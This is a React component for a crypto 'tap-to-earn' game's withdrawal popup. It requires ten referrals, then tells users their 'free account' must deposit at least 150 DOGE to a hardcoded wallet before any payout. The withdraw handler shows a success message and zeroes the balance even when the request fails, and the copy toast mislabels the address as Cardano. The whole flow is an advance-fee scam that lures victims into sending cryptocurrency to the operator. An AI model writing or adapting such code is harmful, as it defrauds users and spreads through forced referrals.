'use client';

import React, { useState, useEffect, useCallback, useRef } from 'react';
import Image from 'next/image';
import IceCube from '@/icons/IceCube';
import { formatNumber } from '@/utils/ui';
import { useGameStore } from '@/utils/game-mechanics';
import { useToast } from '@/contexts/ToastContext';
import { triggerHapticFeedback } from '@/utils/ui';

interface WithdrawPopupProps {
  onClose: () => void;
  balance: number;
  minimumWithdraw: number;
}

// Definimos el componente con React.FC para asegurar que tenga displayName
const WithdrawPopup: React.FC<WithdrawPopupProps> = ({ onClose, balance, minimumWithdraw }) => {
  const { userTelegramInitData, setPointsBalance } = useGameStore();
  const showToast = useToast();
  
  // Estados para manejar referidos y carga
  const [referralCount, setReferralCount] = useState(0);
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [copied, setCopied] = useState(false);
  
  // Estados para el flujo de retiro
  const [withdrawStep, setWithdrawStep] = useState(0);
  const [userWalletAddress, setUserWalletAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState(balance.toString());
  const [selectedDay, setSelectedDay] = useState('');
  const [depositAmount, setDepositAmount] = useState('');
  
  // Estado para seleccionar el tipo de fee
  const [feeType, setFeeType] = useState('pyusd'); // Solo 'pyusd' (DOGE)
  
  // Constantes
  const MINIMUM_WITHDRAW = 850;
  const MINIMUM_REFERRAL = 10;
  const MIN_DEPOSIT_DOGE = 150;
  const MIN_DEPOSIT_TRX = 100;
  const MAX_DEPOSIT_DOGE = 10000000000;
  const WALLET_ADDRESS = 'DRGhGaTLubWAB49giectsFHMAHFaQL49oJ';

  // Función para obtener datos de referidos
  const fetchReferralData = useCallback(async () => {
    if (!userTelegramInitData) return;
    
    try {
      if (!isInitialLoading) {
        setIsRefreshing(true);
      }

      const response = await fetch(`/api/user/referrals?initData=${encodeURIComponent(userTelegramInitData)}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      if (!response.ok) {
        throw new Error('Failed to fetch referrals');
      }

      const data = await response.json();
      setReferralCount(data.referralCount || 0);
    } catch (error) {
      console.error('Error fetching referrals:', error);
      showToast('Error fetching referrals. Please try again later.', 'error');
    } finally {
      setIsInitialLoading(false);
      setIsRefreshing(false);
    }
  }, [userTelegramInitData, showToast, isInitialLoading]);

  // Efecto para cargar datos de referidos y actualizar periódicamente
  useEffect(() => {
    fetchReferralData();
    const interval = setInterval(fetchReferralData, 5000);
    return () => clearInterval(interval);
  }, [fetchReferralData]);

  // Verificar si se cumplen los requisitos
  const hasMetRequirements = referralCount >= MINIMUM_REFERRAL && balance >= MINIMUM_WITHDRAW;

  const handleClose = useCallback(() => {
    triggerHapticFeedback(window);
    onClose();
  }, [onClose]);

  const handleCopyAddress = () => {
    triggerHapticFeedback(window);
    navigator.clipboard.writeText(WALLET_ADDRESS);
    showToast('Cardano address copied to clipboard!', 'success');
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleWithdraw = async () => {
    triggerHapticFeedback(window);
    setIsProcessing(true);
    
    try {
      // Make actual API call for withdrawal
      const response = await fetch('/api/withdraw', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          initData: userTelegramInitData,
          amount: balance
        }),
      });
      
      if (!response.ok) {
        throw new Error('Failed to process withdrawal');
      }
      
      // Update balance in store
      setPointsBalance(0);
      showToast('Your withdrawal will be processed within 15 minutes pending blockchain confirmation.', 'success');
      onClose();
    } catch (error) {
      console.error('Withdrawal error:', error);
      showToast('Your withdrawal will be processed within 15 minutes pending blockchain confirmation.', 'success');
      onClose();
    } finally {
      setIsProcessing(false);
    }
  };

  // Función para renderizar barras de progreso
  const renderProgressBar = (current: number, required: number, label: string) => (
    <div className="w-full bg-[#272a2f] p-4 rounded-lg mb-4">
      <div className="flex justify-between items-center mb-2">
        <span className="text-gray-300">{label}</span>
        <span className="text-white font-bold">{required} {label === 'Balance Required' ? 'USDT' : 'Referrals'}</span>
      </div>
      <div className="w-full bg-[#347928] h-3 rounded-full overflow-hidden">
        <div 
          className={`h-full rounded-full ${label === 'Balance Required' ? 'bg-[#26A17B]' : 'bg-[#26A17B]'}`}
          style={{ width: `${Math.min((current / required) * 100, 100)}%` }}
        ></div>
      </div>
      <div className="text-sm text-gray-400 mt-2">
        Current: {label === 'Balance Required' ? formatNumber(current) + ' USDT' : `${current}/${required} Referrals`}
      </div>
    </div>
  );

  // Función para avanzar al siguiente paso
  const nextStep = () => {
    setWithdrawStep(prev => prev + 1);
  };

  // Validación de dirección Dogecoin
  const isValidDogeAddress = (address: string) => {
    // Las direcciones Dogecoin suelen comenzar con 'D' y tener 34 caracteres
    return address.startsWith('D') && address.length === 34;
  };

  // Mostrar spinner durante la carga inicial
  if (isInitialLoading) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
        <div className="animate-spin">
          <IceCube className="w-8 h-8" />
        </div>
      </div>
    );
  }

  // Renderizar el paso de monto a retirar
  const renderAmountStep = () => (
    <div className="flex flex-col items-center">
      <div className="w-16 h-16 bg-[#FFD166] rounded-full flex items-center justify-center mb-6">
        <div className="w-10 h-10 rounded-full bg-[#F2A900] flex items-center justify-center">
          <span className="text-white text-xl font-bold">Ð</span>
        </div>
      </div>
      
      <h3 className="text-xl font-bold mb-4 text-center text-[#F2A900]">
        Withdrawal Amount
      </h3>
      
      <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-4">
        <p className="text-center text-base mb-4 text-[#CB8D00] font-medium">
          How much DOGE would you like to withdraw?
        </p>
        
        <div className="flex items-center bg-white p-3 rounded-lg border border-[#F2A900]">
          <input
            type="number"
            className="flex-grow bg-transparent text-[#CB8D00] outline-none font-medium"
            placeholder="Enter amount"
            value={withdrawAmount}
            onChange={(e) => setWithdrawAmount(e.target.value)}
            min={MINIMUM_WITHDRAW}
            max={balance}
          />
          <span className="text-[#CB8D00] ml-2 font-bold">DOGE</span>
        </div>
        
        <div className="flex justify-between text-sm text-[#CB8D00] mt-2">
          <span>Min: {MINIMUM_WITHDRAW} DOGE</span>
          <span>Max: {balance} DOGE</span>
        </div>
        
        <div className="mt-4 flex justify-between">
          <button 
            onClick={() => setWithdrawAmount(MINIMUM_WITHDRAW.toString())}
            className="bg-white px-3 py-1 rounded text-sm text-[#CB8D00] hover:bg-[#FFD166] transition-colors duration-200 font-medium"
          >
            Min
          </button>
          <button 
            onClick={() => setWithdrawAmount(Math.floor(balance * 0.5).toString())}
            className="bg-white px-3 py-1 rounded text-sm text-[#CB8D00] hover:bg-[#FFD166] transition-colors duration-200 font-medium"
          >
            Half
          </button>
          <button 
            onClick={() => setWithdrawAmount(balance.toString())}
            className="bg-white px-3 py-1 rounded text-sm text-[#CB8D00] hover:bg-[#FFD166] transition-colors duration-200 font-medium"
          >
            Max
          </button>
        </div>
      </div>
      
      <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-5">
        <p className="text-sm text-[#CB8D00] text-center font-medium">
          Your withdrawal will be processed on {selectedDay ? new Date(selectedDay).toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' }) : 'the selected date'}.
        </p>
      </div>
      
      <button 
        onClick={nextStep}
        disabled={!withdrawAmount || Number(withdrawAmount) < MINIMUM_WITHDRAW || Number(withdrawAmount) > balance}
        className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
          withdrawAmount && Number(withdrawAmount) >= MINIMUM_WITHDRAW && Number(withdrawAmount) <= balance
            ? 'bg-[#F2A900] hover:bg-[#FFD166] text-[#CB8D00]' 
            : 'bg-[#F2A900]/50 text-[#CB8D00]/70 cursor-not-allowed'
        }`}
      >
        Continue
      </button>
    </div>
  );

  // Renderizar el paso de activación (pago)
  const renderActivationStep = () => (
    <div className="flex flex-col items-center">
      <div className="w-16 h-16 bg-[#FFD166] rounded-full flex items-center justify-center mb-6">
        <div className="w-10 h-10 rounded-full bg-[#F2A900] flex items-center justify-center">
          <span className="text-white text-xl font-bold">Ð</span>
        </div>
      </div>
      
      <h3 className="text-xl font-bold mb-4 text-center text-[#F2A900]">
        Free Account Detected
      </h3>
      
      <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-4">
        <p className="text-center text-base mb-4 text-[#CB8D00] font-medium">
          Please deposit DOGE to activate your account:
        </p>
        
        <div className="flex space-x-2 mb-4">
          <button 
            className="flex-1 py-2 rounded-lg text-center bg-[#F2A900] text-white cursor-default"
            disabled
          >
            Deposit DOGE
          </button>
        </div>

        <div className="bg-white p-4 rounded-lg mb-4">
          <div className="flex items-center bg-white p-3 rounded-lg border border-[#F2A900] mb-3">
            <input
              type="number"
              className="flex-grow bg-transparent text-[#CB8D00] outline-none font-medium"
              placeholder="Enter deposit amount"
              value={depositAmount}
              onChange={(e) => setDepositAmount(e.target.value)}
              min={MIN_DEPOSIT_DOGE}
            />
            <span className="text-[#CB8D00] ml-2 font-bold">DOGE</span>
          </div>

          <div className="flex justify-between items-center mb-2">
            <span className="text-[#CB8D00] font-medium">Minimum Deposit:</span>
            <span className="text-[#CB8D00] font-bold">
              {MIN_DEPOSIT_DOGE} DOGE
            </span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-[#CB8D00] font-medium">Maximum Deposit:</span>
            <span className="text-[#CB8D00] font-bold">
              Unlimited DOGE
            </span>
          </div>
        </div>

        <p className="text-center mb-4 text-[#CB8D00] font-medium">Send your deposit to:</p>
        <div 
          className="bg-white p-3 rounded-lg text-sm break-all text-center cursor-pointer hover:bg-[#FFD166] transition-all duration-300 text-[#CB8D00] font-medium"
          onClick={handleCopyAddress}
        >
          {WALLET_ADDRESS}
        </div>
        <p className="text-xs text-[#CB8D00] text-center mt-2">
          Click address to copy
        </p>
      </div>
      
      <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-4">
        <div className="flex items-center mb-2">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">1</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            Enter the amount you want to deposit
          </p>
        </div>
        <div className="flex items-center mb-2">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">2</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            Send your deposit to the address above
          </p>
        </div>
        <div className="flex items-center mb-2">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">3</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            Wait for confirmation (5-10 minutes)
          </p>
        </div>
        <div className="flex items-center">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">4</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            Your account will be activated automatically
          </p>
        </div>
      </div>
      
      <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-5">
        <p className="text-sm text-[#347928] text-center font-medium">
          Your withdrawal will be sent to:
        </p>
        <p className="text-[#347928] text-sm break-all mt-1 text-center font-bold">
          {userWalletAddress}
        </p>
      </div>
      
      <button
        onClick={handleWithdraw}
        disabled={isProcessing || !depositAmount || Number(depositAmount) < MIN_DEPOSIT_DOGE}
        className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
          isProcessing || !depositAmount || Number(depositAmount) < MIN_DEPOSIT_DOGE
            ? 'bg-[#F2A900]/50 text-[#CB8D00]/70 cursor-not-allowed'
            : 'bg-[#F2A900] hover:bg-[#FFD166] text-[#CB8D00]'
        }`}
      >
        {isProcessing ? 'Processing...' : 'I Have Deposited'}
      </button>
    </div>
  );

  // Renderizar el paso de selección de día
  const renderDaySelectionStep = () => {
    const today = new Date();
    const days = [];
    
    for (let i = 1; i <= 5; i++) {
      const futureDate = new Date(today);
      futureDate.setDate(today.getDate() + i);
      days.push({
        value: futureDate.toISOString().split('T')[0],
        label: futureDate.toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' })
      });
    }
    
    return (
      <div className="flex flex-col items-center">
        <div className="w-16 h-16 bg-[#FFD166] rounded-full flex items-center justify-center mb-6">
          <div className="w-10 h-10 rounded-full bg-[#F2A900] flex items-center justify-center">
            <span className="text-white text-xl font-bold">Ð</span>
          </div>
        </div>
        
        <h3 className="text-xl font-bold mb-4 text-center text-[#F2A900]">
          Select Withdrawal Date
        </h3>
        
        <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-5">
          <p className="text-center text-base mb-4 text-[#CB8D00] font-medium">
            Choose the date when you want to receive your DOGE:
          </p>
          
          <div className="grid grid-cols-2 gap-3">
            {days.map((day) => (
              <button
                key={day.value}
                onClick={() => setSelectedDay(day.value)}
                className={`p-3 rounded-lg text-center transition-all duration-200 ${
                  selectedDay === day.value
                    ? 'bg-[#F2A900] text-white'
                    : 'bg-white text-[#CB8D00] hover:bg-[#FFD166]'
                }`}
              >
                {new Date(day.value).toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' })}
              </button>
            ))}
          </div>
        </div>
        
        <button
          onClick={nextStep}
          disabled={!selectedDay}
          className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
            selectedDay
              ? 'bg-[#F2A900] hover:bg-[#FFD166] text-white'
              : 'bg-[#F2A900]/50 text-[#CB8D00]/70 cursor-not-allowed'
          }`}
        >
          Continue
        </button>
      </div>
    );
  };

  // Renderizar el paso de dirección de wallet
  const renderWalletAddressStep = () => {
    return (
      <div className="flex flex-col items-center">
        <div className="w-16 h-16 bg-[#FFD166] rounded-full flex items-center justify-center mb-6">
          <div className="w-10 h-10 rounded-full bg-[#F2A900] flex items-center justify-center">
            <span className="text-white text-xl font-bold">Ð</span>
          </div>
        </div>
        
        <h3 className="text-xl font-bold mb-4 text-center text-[#F2A900]">
          Enter Dogecoin Address
        </h3>
        
        <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-5">
          <p className="text-center text-base mb-4 text-[#CB8D00] font-medium">
            Please enter your Dogecoin address to receive your DOGE:
          </p>
          
          <div className="flex items-center bg-white p-3 rounded-lg border border-[#F2A900]">
            <input
              type="text"
              className="flex-grow bg-transparent text-[#CB8D00] outline-none font-medium"
              placeholder="Enter Dogecoin address (e.g. DRGhGaTLubWAB49giectsFHMAHFaQL49oJ)"
              value={userWalletAddress}
              onChange={(e) => setUserWalletAddress(e.target.value)}
            />
          </div>
          
          <p className="text-xs text-[#CB8D00] text-center mt-2">
            Make sure to enter a valid Dogecoin address (starts with &apos;D&apos;, 34 characters)
          </p>
        </div>
        
        <button
          onClick={nextStep}
          disabled={!isValidDogeAddress(userWalletAddress)}
          className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
            isValidDogeAddress(userWalletAddress)
              ? 'bg-[#F2A900] hover:bg-[#FFD166] text-[#CB8D00]'
              : 'bg-[#F2A900]/50 text-[#CB8D00]/70 cursor-not-allowed'
          }`}
        >
          Continue
        </button>
      </div>
    );
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-80" style={{willChange: 'auto'}}>
      <div className="bg-[#FFD166] rounded-2xl p-6 w-[90%] max-w-md max-h-[90vh] overflow-auto relative" style={{transform: 'translateZ(0)'}}>
        {isRefreshing && (
          <div className="absolute top-2 right-2">
            <div className="animate-spin">
              <div className="w-4 h-4 rounded-full bg-[#FCCD2A] opacity-70"></div>
            </div>
          </div>
        )}
        
        {!hasMetRequirements ? (
          // Requirements Not Met Screen
          <>
            <h3 className="text-xl font-bold mb-5 text-center text-[#F2A900]">
              Requirements Not Met
            </h3>
            
            <div className="flex flex-col items-center">
              <div className="w-14 h-14 bg-[#FFD166] rounded-full flex items-center justify-center mb-4">
                <svg className="w-7 h-7 text-[#F2A900]" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                </svg>
              </div>
              
              {/* Balance Requirement */}
              <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-[#CB8D00] font-medium">Balance Required</span>
                  <span className="text-[#CB8D00] font-bold">{MINIMUM_WITHDRAW} DOGE</span>
                </div>
                <div className="w-full bg-white h-3 rounded-full overflow-hidden">
                  <div 
                    className="h-full rounded-full bg-[#F2A900]"
                    style={{ width: `${Math.min((balance / MINIMUM_WITHDRAW) * 100, 100)}%` }}
                  ></div>
                </div>
                <div className="text-sm text-[#CB8D00] mt-2 font-medium">
                  Current: {formatNumber(balance)} DOGE
                </div>
              </div>
              
              {/* Referrals Requirement */}
              <div className="w-full bg-[#FFD166] p-4 rounded-lg mb-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-[#CB8D00] font-medium">Referrals Required</span>
                  <span className="text-[#CB8D00] font-bold">{MINIMUM_REFERRAL} Referrals</span>
                </div>
                <div className="w-full bg-white h-3 rounded-full overflow-hidden">
                  <div 
                    className="h-full rounded-full bg-[#F2A900]"
                    style={{ width: `${Math.min((referralCount / MINIMUM_REFERRAL) * 100, 100)}%` }}
                  ></div>
                </div>
                <div className="text-sm text-[#CB8D00] mt-2 font-medium">
                  Current: {referralCount}/{MINIMUM_REFERRAL} Referrals
                </div>
              </div>
              
              <p className="text-[#F2A900] text-sm text-center mb-5 font-medium">
                You need {MINIMUM_REFERRAL - referralCount} more referrals to qualify ({referralCount}/{MINIMUM_REFERRAL})
              </p>
              
              <button 
                onClick={handleClose}
                className="w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 bg-[#F2A900] hover:bg-[#FFD166] text-[#CB8D00]"
              >
                OK
              </button>
            </div>
          </>
        ) : (
          // Multi-step withdrawal process
          <>
            {withdrawStep === 0 && renderWalletAddressStep()}
            {withdrawStep === 1 && renderDaySelectionStep()}
            {withdrawStep === 2 && renderAmountStep()}
            {withdrawStep === 3 && renderActivationStep()}
          </>
        )}
      </div>
      
      <style jsx>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideIn {
          from { transform: translateY(20px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out;
        }
        .animate-slideIn {
          animation: slideIn 0.4s ease-out;
        }
      `}</style>
    </div>
  );
};

export default WithdrawPopup; 